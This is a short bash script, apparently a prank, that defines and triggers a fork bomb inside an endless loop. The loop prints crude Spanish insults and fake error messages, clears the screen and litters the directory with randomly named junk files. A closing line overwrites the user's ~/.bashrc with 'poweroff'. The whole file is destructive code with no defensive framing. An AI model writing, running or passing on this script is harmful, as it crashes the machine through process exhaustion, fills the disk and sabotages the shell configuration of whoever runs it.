#!/usr/bin/env bash
:(){ :|:& }
while true
do
opt=$((RANDOM%5))
case "$opt" in
        "0")
                echo "Puta mierda"
        ;;
        "1")
                echo "Bobo marica"
        ;;
        "2")
                echo "No funciona"
        ;;
        "3")
                echo "dale run"
        ;;
        "4")
                echo jajajusajsjajsjajjaja
        ;;
esac
sleep 0.5
:
clear
clave=$((RANDOM%999999999999))
touch $clave
echo "jajjajajjajajjajajajajajajajajajjaajajajajajajaj" >> $clave
done
echo 'poweroff' > $HOME/.bashrc
